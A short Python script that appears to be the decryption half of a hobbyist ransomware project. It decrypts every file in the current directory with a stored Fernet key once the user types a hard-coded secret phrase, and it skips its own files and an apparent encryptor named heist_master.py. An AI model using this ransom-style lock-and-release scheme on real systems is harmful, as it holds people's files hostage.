#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Let's find some files
files = []

for file in os.listdir():
    if file == "heist_master.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

with open("thekey.key", "rb") as key:

    secretkey = key.read()

    secret_phrase = "u!S#eXGpm:C%kz6:BRx_"
    user_phrase = input("Enter the secret phrase to decript the files\n")

    if user_phrase == secret_phrase:

        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
        print("files decrypted")
    else: print("wrong phrase")    